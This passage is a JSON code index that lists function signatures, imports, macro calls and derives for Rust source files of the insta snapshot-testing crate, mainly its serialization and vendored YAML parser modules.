          "fn find_common_prefix(sorted_paths: &[PathBuf]) -> Option<&Path> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::env;",
          "use std::path::{Path, PathBuf};",
          "use std::sync::Mutex;",
          "use globset::{GlobBuilder, GlobMatcher};",
          "use once_cell::sync::Lazy;",
          "use walkdir::WalkDir;",
          "use crate::env::get_tool_config;",
          "use crate::settings::Settings;",
          "use crate::utils::style;"
        ],
        "macros": [
          "panic!(\"Parent directory traversal is not supported in glob patterns. Use the th",
          "eprintln!(\"Skipping {} due to glob filter\", stripped_path.display());",
          "panic!(\"the glob! macro did not match any files.\");",
          "println!(",
          "println!(",
          "panic!("
        ],
        "derives": [],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/utils.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {",
          "fn test_format_rust_expression() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::{",
          "use crate::assert_snapshot;"
        ],
        "macros": [
          "style_attr!(red green yellow cyan bold dim underlined);",
          "assert_snapshot!(format_rust_expression(\"vec![1,2,3]\"), @\"vec![1, 2, 3]\");",
          "assert_snapshot!(format_rust_expression(\"vec![1,2,3].iter()\"), @\"vec![1, 2, 3].i",
          "assert_snapshot!(format_rust_expression(r#\"    \"aoeu\"\"#), @r#\"\"aoeu\"\"#);",
          "assert_snapshot!(format_rust_expression(r#\"  \"aoe\ud83d\ude04\"\"#), @r#\"\"aoe\ud83d\ude04\"\"#);",
          "assert_snapshot!(format_rust_expression(\"\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\"), @\"\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\")"
        ],
        "derives": [],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/serialization.rs",
        "function_defs": [
          "fn discriminant(&self) -> usize {",
          "fn cmp(&self, other: &Self) -> Ordering {",
          "fn partial_cmp(&self, other: &Self) -> Option<Ordering> {",
          "fn f64_total_cmp(left: f64, right: f64) -> Ordering {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn serialize_bool(self, v: bool) -> Result<Content, E> {",
          "fn serialize_i8(self, v: i8) -> Result<Content, E> {",
          "fn serialize_i16(self, v: i16) -> Result<Content, E> {",
          "fn serialize_i32(self, v: i32) -> Result<Content, E> {",
          "fn serialize_i64(self, v: i64) -> Result<Content, E> {",
          "fn serialize_i128(self, v: i128) -> Result<Content, E> {",
          "fn serialize_u8(self, v: u8) -> Result<Content, E> {",
          "fn serialize_u16(self, v: u16) -> Result<Content, E> {",
          "fn serialize_u32(self, v: u32) -> Result<Content, E> {",
          "fn serialize_u64(self, v: u64) -> Result<Content, E> {",
          "fn serialize_u128(self, v: u128) -> Result<Content, E> {",
          "fn serialize_f32(self, v: f32) -> Result<Content, E> {",
          "fn serialize_f64(self, v: f64) -> Result<Content, E> {",
          "fn serialize_char(self, v: char) -> Result<Content, E> {",
          "fn serialize_str(self, value: &str) -> Result<Content, E> {",
          "fn serialize_bytes(self, value: &[u8]) -> Result<Content, E> {",
          "fn serialize_none(self) -> Result<Content, E> {",
          "fn serialize_some<T>(self, value: &T) -> Result<Content, E>",
          "fn serialize_unit(self) -> Result<Content, E> {",
          "fn serialize_unit_struct(self, name: &'static str) -> Result<Content, E> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, name: &'static str, value: &T) -> Result<Content, E>",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_seq(self, len: Option<usize>) -> Result<Self::SerializeSeq, E> {",
          "fn serialize_tuple(self, len: usize) -> Result<Self::SerializeTuple, E> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, len: Option<usize>) -> Result<Self::SerializeMap, E> {",
          "fn serialize_struct(self, name: &'static str, len: usize) -> Result<Self::SerializeStruct, E> {",
          "fn serialize_struct_variant(",
          "fn serialize_element<T>(&mut self, value: &T) -> Result<(), E>",
          "fn end(self) -> Result<Content, E> {",
          "fn serialize_element<T>(&mut self, value: &T) -> Result<(), E>",
          "fn end(self) -> Result<Content, E> {",
          "fn serialize_field<T>(&mut self, value: &T) -> Result<(), E>",
          "fn end(self) -> Result<Content, E> {",
          "fn serialize_field<T>(&mut self, value: &T) -> Result<(), E>",
          "fn end(self) -> Result<Content, E> {",
          "fn serialize_key<T>(&mut self, key: &T) -> Result<(), E>",
          "fn serialize_value<T>(&mut self, value: &T) -> Result<(), E>",
          "fn end(self) -> Result<Content, E> {",
          "fn serialize_entry<K, V>(&mut self, key: &K, value: &V) -> Result<(), E>",
          "fn serialize_field<T>(&mut self, key: &'static str, value: &T) -> Result<(), E>",
          "fn end(self) -> Result<Content, E> {",
          "fn serialize_field<T>(&mut self, key: &'static str, value: &T) -> Result<(), E>",
          "fn end(self) -> Result<Content, E> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Key<'_> {",
          "impl Eq for Key<'_> {}",
          "impl Ord for Key<'_> {",
          "impl PartialOrd for Key<'_> {",
          "impl Content {",
          "impl Serialize for Content {"
        ],
        "uses": [
          "use std::cmp::Ordering;",
          "use std::marker::PhantomData;",
          "use crate::content::Content;",
          "use serde::{ser, Serialize, Serializer};",
          "use serde::ser::SerializeTuple;",
          "use serde::ser::SerializeTupleStruct;",
          "use serde::ser::SerializeTupleVariant;",
          "use serde::ser::SerializeMap;",
          "use serde::ser::SerializeStruct;",
          "use serde::ser::SerializeStructVariant;"
        ],
        "macros": [],
        "derives": [
          "#[derive(PartialEq, Debug)]"
        ],
        "error_handling": 44
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/json.rs",
        "function_defs": [
          "fn write_indentation(&mut self) {",
          "fn start_container(&mut self, c: char) {",
          "fn end_container(&mut self, c: char, empty: bool) {",
          "fn write_comma(&mut self, first: bool) {",
          "fn write_colon(&mut self) {",
          "fn serialize_array(&mut self, items: &[Content]) {",
          "fn serialize_object(&mut self, fields: &[(&str, Content)]) {",
          "fn write_str(&mut self, s: &str) {",
          "fn write_char(&mut self, c: char) {",
          "fn write_escaped_str(&mut self, value: &str) {",
          "fn test_to_string() {",
          "fn test_to_string_pretty() {",
          "fn test_to_string_num_keys() {",
          "fn test_to_string_pretty_complex() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Serializer {"
        ],
        "uses": [
          "use std::fmt::{Display, Write};",
          "use crate::content::Content;"
        ],
        "macros": [
          "let mut rv = format!(\"{value}\");",
          "write!(self.out, \"{: ^1$}\", \"\", self.indentation * 2).unwrap();",
          "Content::U8(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::U16(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::U32(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::U64(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::U128(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::I8(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::I16(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::I32(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::I64(n) => write!(self.out, \"{n}\").unwrap(),",
          "Content::I128(n) => write!(self.out, \"{n}\").unwrap(),",
          "panic!(\"cannot serialize maps without string keys to JSON\");",
          "_ => unreachable!(),",
          "crate::assert_snapshot!(&json, @r#\"{\"environments\":[\"development\",\"production\"],",
          "crate::assert_snapshot!(&json, @r#\"",
          "crate::assert_snapshot!(&json, @r#\"",
          "crate::assert_snapshot!(&json, @r##\""
        ],
        "derives": [
          "#[derive(PartialEq, Eq, Copy, Clone, Debug)]"
        ],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/mod.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(value: $ty) -> Content {",
          "fn from(_value: ()) -> Content {",
          "fn from(value: &'a str) -> Content {",
          "fn from(value: &'a [u8]) -> Content {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl fmt::Display for Error {",
          "impl std::error::Error for Error {}",
          "impl From<$ty> for Content {",
          "impl From<()> for Content {",
          "impl Content {"
        ],
        "uses": [
          "use std::fmt;"
        ],
        "macros": [
          "f.write_str(format!(\"Failed parsing the YAML from {:?}\", p.display()).as_str())",
          "f.write_str(format!(\"File error for {:?}: {}\", p.display(), e).as_str())",
          "impl_from!(bool, Bool);",
          "impl_from!(u8, U8);",
          "impl_from!(u16, U16);",
          "impl_from!(u32, U32);",
          "impl_from!(u64, U64);",
          "impl_from!(u128, U128);",
          "impl_from!(i8, I8);",
          "impl_from!(i16, I16);",
          "impl_from!(i32, I32);",
          "impl_from!(i64, I64);",
          "impl_from!(i128, I128);",
          "impl_from!(f32, F32);",
          "impl_from!(f64, F64);",
          "impl_from!(char, Char);",
          "impl_from!(String, String);",
          "impl_from!(Vec<u8>, Bytes);",
          "matches!(self.resolve_inner(), Content::None | Content::Unit)"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug, Clone, PartialEq, PartialOrd)]"
        ],
        "error_handling": 18
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/yaml/mod.rs",
        "function_defs": [
          "fn from_yaml_blob(blob: YamlValue, filename: &Path) -> Result<Content, Error> {",
          "fn to_yaml_value(content: &Content) -> YamlValue {",
          "fn translate_seq(seq: &[Content]) -> YamlValue {",
          "fn translate_fields(fields: &[(&str, Content)]) -> YamlValue {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::path::Path;",
          "use crate::content::{Content, Error};",
          "use crate::content::yaml::vendored::Yaml as YamlValue;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/yaml/vendored/scanner.rs",
        "function_defs": [
          "fn new(index: usize, line: usize, col: usize) -> Marker {",
          "fn description(&self) -> &str {",
          "fn cause(&self) -> Option<&dyn Error> {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn new(mark: Marker) -> SimpleKey {",
          "fn next(&mut self) -> Option<Token> {",
          "fn is_z(c: char) -> bool {",
          "fn is_break(c: char) -> bool {",
          "fn is_breakz(c: char) -> bool {",
          "fn is_blank(c: char) -> bool {",
          "fn is_blankz(c: char) -> bool {",
          "fn is_digit(c: char) -> bool {",
          "fn is_alpha(c: char) -> bool {",
          "fn is_hex(c: char) -> bool {",
          "fn as_hex(c: char) -> u32 {",
          "fn is_flow(c: char) -> bool {",
          "fn lookahead(&mut self, count: usize) {",
          "fn skip(&mut self) {",
          "fn skip_line(&mut self) {",
          "fn ch(&self) -> char {",
          "fn ch_is(&self, c: char) -> bool {",
          "fn eof(&self) -> bool {",
          "fn read_break(&mut self, s: &mut String) {",
          "fn insert_token(&mut self, pos: usize, tok: Token) {",
          "fn allow_simple_key(&mut self) {",
          "fn disallow_simple_key(&mut self) {",
          "fn stale_simple_keys(&mut self) -> ScanResult {",
          "fn skip_to_next_token(&mut self) {",
          "fn fetch_stream_start(&mut self) {",
          "fn fetch_stream_end(&mut self) -> ScanResult {",
          "fn fetch_directive(&mut self) -> ScanResult {",
          "fn scan_directive(&mut self) -> Result<Token, ScanError> {",
          "fn scan_version_directive_value(&mut self, mark: &Marker) -> Result<Token, ScanError> {",
          "fn scan_directive_name(&mut self) -> Result<String, ScanError> {",
          "fn scan_version_directive_number(&mut self, mark: &Marker) -> Result<u32, ScanError> {",
          "fn scan_tag_directive_value(&mut self, mark: &Marker) -> Result<Token, ScanError> {",
          "fn fetch_tag(&mut self) -> ScanResult {",
          "fn scan_tag(&mut self) -> Result<Token, ScanError> {",
          "fn scan_tag_handle(&mut self, directive: bool, mark: &Marker) -> Result<String, ScanError> {",
          "fn scan_tag_uri(",
          "fn scan_uri_escapes(&mut self, _directive: bool, mark: &Marker) -> Result<char, ScanError> {",
          "fn fetch_anchor(&mut self, alias: bool) -> ScanResult {",
          "fn scan_anchor(&mut self, alias: bool) -> Result<Token, ScanError> {",
          "fn fetch_flow_collection_start(&mut self, tok: TokenType) -> ScanResult {",
          "fn fetch_flow_collection_end(&mut self, tok: TokenType) -> ScanResult {",
          "fn fetch_flow_entry(&mut self) -> ScanResult {",
          "fn increase_flow_level(&mut self) -> ScanResult {",
          "fn decrease_flow_level(&mut self) {",
          "fn fetch_block_entry(&mut self) -> ScanResult {",
          "fn fetch_document_indicator(&mut self, t: TokenType) -> ScanResult {",
          "fn fetch_block_scalar(&mut self, literal: bool) -> ScanResult {",
          "fn scan_block_scalar(&mut self, literal: bool) -> Result<Token, ScanError> {",
          "fn block_scalar_breaks(&mut self, indent: &mut usize, breaks: &mut String) -> ScanResult {",
          "fn fetch_flow_scalar(&mut self, single: bool) -> ScanResult {",
          "fn scan_flow_scalar(&mut self, single: bool) -> Result<Token, ScanError> {",
          "fn fetch_plain_scalar(&mut self) -> ScanResult {",
          "fn scan_plain_scalar(&mut self) -> Result<Token, ScanError> {",
          "fn fetch_key(&mut self) -> ScanResult {",
          "fn fetch_value(&mut self) -> ScanResult {",
          "fn roll_indent(&mut self, col: usize, number: Option<usize>, tok: TokenType, mark: Marker) {",
          "fn unroll_indent(&mut self, col: isize) {",
          "fn save_simple_key(&mut self) -> Result<(), ScanError> {",
          "fn remove_simple_key(&mut self) -> ScanResult {",
          "fn test_empty() {",
          "fn test_scalar() {",
          "fn test_explicit_scalar() {",
          "fn test_multiple_documents() {",
          "fn test_a_flow_sequence() {",
          "fn test_a_flow_mapping() {",
          "fn test_block_sequences() {",
          "fn test_block_mappings() {",
          "fn test_no_block_sequence_start() {",
          "fn test_collections_in_sequence() {",
          "fn test_collections_in_mapping() {",
          "fn test_spec_ex7_3() {",
          "fn test_plain_scalar_starting_with_indicators_in_flow() {",
          "fn test_plain_scalar_starting_with_indicators_in_block() {",
          "fn test_plain_scalar_containing_indicators_in_block() {",
          "fn test_scanner_cr() {",
          "fn test_uri() {",
          "fn test_uri_escapes() {"
        ],
        "struct_defs": [
          "struct SimpleKey {"
        ],
        "impl_blocks": [
          "impl Marker {",
          "impl ScanError {",
          "impl Error for ScanError {",
          "impl fmt::Display for ScanError {",
          "impl SimpleKey {"
        ],
        "uses": [
          "use std::collections::VecDeque;",
          "use std::error::Error;",
          "use std::{char, fmt};",
          "use super::TokenType::*;",
          "use super::*;"
        ],
        "macros": [
          "write!(",
          "matches!(c, '0'..='9' | 'a'..='z' | 'A'..='Z' | '_' | '-')",
          "_ => unreachable!(),",
          "matches!(c, ',' | '[' | ']' | '{' | '}')",
          "unreachable!();",
          "assert!(pos <= old_len);",
          "// println!(\"--> fetch_next_token Cur {:?} {:?}\", self.mark, self.ch());",
          "&format!(\"unexpected character: `{c}'\"),",
          "_ => panic!(\"unexpected token: {:?}\", tok),",
          "assert_eq!(style, $tk);",
          "assert_eq!(v, $v);",
          "_ => panic!(\"unexpected token: {:?}\", tok),",
          "assert_eq!($p.next(), None);",
          "next!(p, StreamStart(..));",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, Scalar(TScalarStyle::Plain, _));",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, DocumentStart);",
          "next!(p, Scalar(TScalarStyle::SingleQuoted, _));",
          "next!(p, DocumentEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, Scalar(TScalarStyle::SingleQuoted, _));",
          "next!(p, DocumentStart);",
          "next!(p, Scalar(TScalarStyle::SingleQuoted, _));",
          "next!(p, DocumentStart);",
          "next!(p, Scalar(TScalarStyle::SingleQuoted, _));",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, FlowSequenceStart);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 1\");",
          "next!(p, FlowEntry);",
          "next!(p, Scalar(TScalarStyle::Plain, _));",
          "next!(p, FlowEntry);",
          "next!(p, Scalar(TScalarStyle::Plain, _));",
          "next!(p, FlowSequenceEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, FlowMappingStart);",
          "next!(p, Key);",
          "next!(p, Scalar(TScalarStyle::Plain, _));",
          "next!(p, Value);",
          "next!(p, Scalar(TScalarStyle::Plain, _));",
          "next!(p, FlowEntry);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"a complex key\");",
          "next!(p, Value);",
          "next!(p, Scalar(TScalarStyle::Plain, _));",
          "next!(p, FlowEntry);",
          "next!(p, FlowMappingEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, BlockSequenceStart);",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 1\");",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 2\");",
          "next!(p, BlockEntry);",
          "next!(p, BlockSequenceStart);",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 3.1\");",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 3.2\");",
          "next!(p, BlockEnd);",
          "next!(p, BlockEntry);",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"key 1\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"value 1\");",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"key 2\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"value 2\");",
          "next!(p, BlockEnd);",
          "next!(p, BlockEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next!(p, Scalar(_, _));",
          "next!(p, Value);",
          "next!(p, Scalar(_, _));",
          "next!(p, Key);",
          "next!(p, Scalar(_, _));",
          "next!(p, Value);",
          "next!(p, Scalar(_, _));",
          "next!(p, Key);",
          "next!(p, Scalar(_, _));",
          "next!(p, Value); // libyaml comment seems to be wrong",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next!(p, Scalar(_, _));",
          "next!(p, Value);",
          "next!(p, Scalar(_, _));",
          "next!(p, Key);",
          "next!(p, Scalar(_, _));",
          "next!(p, Value);",
          "next!(p, Scalar(_, _));",
          "next!(p, BlockEnd);",
          "next!(p, Key);",
          "next!(p, Scalar(_, _));",
          "next!(p, Value);",
          "next!(p, BlockSequenceStart);",
          "next!(p, BlockEntry);",
          "next!(p, Scalar(_, _));",
          "next!(p, BlockEntry);",
          "next!(p, Scalar(_, _));",
          "next!(p, BlockEnd);",
          "next!(p, BlockEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"key\");",
          "next!(p, Value);",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 1\");",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 2\");",
          "next!(p, BlockEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, BlockSequenceStart);",
          "next!(p, BlockEntry);",
          "next!(p, BlockSequenceStart);",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 1\");",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 2\");",
          "next!(p, BlockEnd);",
          "next!(p, BlockEntry);",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"key 1\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"value 1\");",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"key 2\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"value 2\");",
          "next!(p, BlockEnd);",
          "next!(p, BlockEntry);",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"complex key\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"complex value\");",
          "next!(p, BlockEnd);",
          "next!(p, BlockEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"a sequence\");",
          "next!(p, Value);",
          "next!(p, BlockSequenceStart);",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 1\");",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"item 2\");",
          "next!(p, BlockEnd);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"a mapping\");",
          "next!(p, Value);",
          "next!(p, BlockMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"key 1\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"value 1\");",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"key 2\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"value 2\");",
          "next!(p, BlockEnd);",
          "next!(p, BlockEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, FlowMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"foo\");",
          "next!(p, Value);",
          "next!(p, FlowEntry);",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"bar\");",
          "next!(p, FlowEntry);",
          "next!(p, FlowMappingEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, FlowMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"a\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \":b\");",
          "next!(p, FlowMappingEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, FlowMappingStart);",
          "next!(p, Key);",
          "next_scalar!(p, TScalarStyle::Plain, \"a\");",
          "next!(p, Value);",
          "next_scalar!(p, TScalarStyle::Plain, \"?b\");",
          "next!(p, FlowMappingEnd);",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next_scalar!(p, TScalarStyle::Plain, \":a\");",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next_scalar!(p, TScalarStyle::Plain, \"?a\");",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next_scalar!(p, TScalarStyle::Plain, \"a:,b\");",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next_scalar!(p, TScalarStyle::Plain, \":,b\");",
          "next!(p, StreamEnd);",
          "end!(p);",
          "next!(p, StreamStart(..));",
          "next!(p, DocumentStart);",
          "next!(p, BlockSequenceStart);",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"tok1\");",
          "next!(p, BlockEntry);",
          "next_scalar!(p, TScalarStyle::Plain, \"tok2\");",
          "next!(p, BlockEnd);",
          "next!(p, StreamEnd);",
          "end!(p);"
        ],
        "derives": [
          "#[derive(Clone, Copy, PartialEq, Debug, Eq)]",
          "#[derive(Clone, Copy, PartialEq, Debug, Eq)]",
          "#[derive(Clone, Copy, PartialEq, Debug, Eq)]",
          "#[derive(Clone, PartialEq, Debug, Eq)]",
          "#[derive(Clone, PartialEq, Debug, Eq)]",
          "#[derive(Clone, PartialEq, Debug, Eq)]",
          "#[derive(Clone, PartialEq, Debug, Eq)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 98
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/yaml/vendored/mod.rs",
        "function_defs": [
          "fn test_api() {",
          "fn try_fail(s: &str) -> Result<Vec<Yaml>, ScanError> {",
          "fn test_fail() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;",
          "use crate::content::yaml::vendored::emitter::YamlEmitter;",
          "use crate::content::yaml::vendored::scanner::ScanError;",
          "use crate::content::yaml::vendored::yaml::YamlLoader;"
        ],
        "macros": [
          "assert_eq!(doc[0][\"name\"].as_str().unwrap(), \"Ogre\");",
          "assert!(!writer.is_empty());",
          "assert!(YamlLoader::load_from_str(s).is_err());",
          "assert!(try_fail(s).is_err());"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/yaml/vendored/emitter.rs",
        "function_defs": [
          "fn cause(&self) -> Option<&dyn Error> {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(f: fmt::Error) -> Self {",
          "fn escape_str(wr: &mut dyn fmt::Write, v: &str) -> Result<(), fmt::Error> {",
          "fn write_indent(&mut self) -> EmitResult {",
          "fn emit_node(&mut self, node: &Yaml) -> EmitResult {",
          "fn emit_array(&mut self, v: &[Yaml]) -> EmitResult {",
          "fn emit_hash(&mut self, h: &Hash) -> EmitResult {",
          "fn emit_val(&mut self, inline: bool, val: &Yaml) -> EmitResult {",
          "fn need_quotes(string: &str) -> bool {",
          "fn need_quotes_spaces(string: &str) -> bool {",
          "fn test_emit_simple() {",
          "fn test_emit_complex() {",
          "fn test_emit_avoid_quotes() {",
          "fn emit_quoted_bools() {",
          "fn test_empty_and_nested_compact() {",
          "fn test_nested_arrays() {",
          "fn test_deeply_nested_arrays() {",
          "fn test_nested_hashes() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Error for EmitError {",
          "impl Display for EmitError {",
          "impl From<fmt::Error> for EmitError {"
        ],
        "uses": [
          "use crate::content::yaml::vendored::yaml::{Hash, Yaml};",
          "use std::error::Error;",
          "use std::fmt::{self, Display};",
          "use super::*;",
          "use crate::content::yaml::vendored::yaml::YamlLoader;"
        ],
        "macros": [
          "writeln!(self.writer, \"---\")?;",
          "write!(self.writer, \" \")?;",
          "write!(self.writer, \"{v}\")?;",
          "write!(self.writer, \"{v}\")?;",
          "write!(self.writer, \"{v}\")?;",
          "write!(self.writer, \"~\")?;",
          "write!(self.writer, \"[]\")?;",
          "writeln!(self.writer)?;",
          "write!(self.writer, \"-\")?;",
          "let complex_key = matches!(*k, Yaml::Hash(_) | Yaml::Array(_));",
          "writeln!(self.writer)?;",
          "write!(self.writer, \"?\")?;",
          "writeln!(self.writer)?;",
          "write!(self.writer, \":\")?;",
          "write!(self.writer, \":\")?;",
          "write!(self.writer, \" \")?;",
          "writeln!(self.writer)?;",
          "write!(self.writer, \" \")?;",
          "writeln!(self.writer)?;",
          "write!(self.writer, \" \")?;",
          "matches!(",
          "matches!(character, ':'",
          "println!(\"original:\\n{s}\");",
          "println!(\"emitted:\\n{writer}\");",
          "Err(e) => panic!(\"{}\", e),",
          "assert_eq!(doc, doc_new);",
          "Err(e) => panic!(\"{}\", e),",
          "assert_eq!(doc, doc_new);",
          "assert_eq!(s, writer, \"actual:\\n\\n{writer}\\n\");",
          "assert_eq!(",
          "assert_eq!(s, writer);",
          "println!(\"original:\\n{s}\");",
          "println!(\"emitted:\\n{writer}\");",
          "assert_eq!(s, writer);",
          "println!(\"original:\\n{s}\");",
          "println!(\"emitted:\\n{writer}\");",
          "assert_eq!(s, writer);",
          "println!(\"original:\\n{s}\");",
          "println!(\"emitted:\\n{writer}\");",
          "assert_eq!(s, writer);"
        ],
        "derives": [
          "#[derive(Copy, Clone, Debug)]"
        ],
        "error_handling": 64
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/yaml/vendored/yaml.rs",
        "function_defs": [
          "fn parse_f64(v: &str) -> Option<f64> {",
          "fn on_event(&mut self, ev: Event, _: Marker) {",
          "fn insert_new_node(&mut self, node: (Yaml, usize)) {",
          "fn index(&self, idx: &'a str) -> &Yaml {",
          "fn index(&self, idx: usize) -> &Yaml {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn next(&mut self) -> Option<Yaml> {",
          "fn test_coerce() {",
          "fn test_empty_doc() {",
          "fn test_parser() {",
          "fn test_multi_doc() {",
          "fn test_bad_anchor() {",
          "fn test_github_27() {",
          "fn test_plain_datatype() {",
          "fn test_bad_hyphen() {",
          "fn test_issue_65() {",
          "fn test_bad_docstart() {",
          "fn test_plain_datatype_with_into_methods() {",
          "fn test_hash_order() {",
          "fn test_integer_key() {",
          "fn test_indentation_equality() {",
          "fn test_two_space_indentations() {",
          "fn test_recursion_depth_check_objects() {",
          "fn test_recursion_depth_check_arrays() {"
        ],
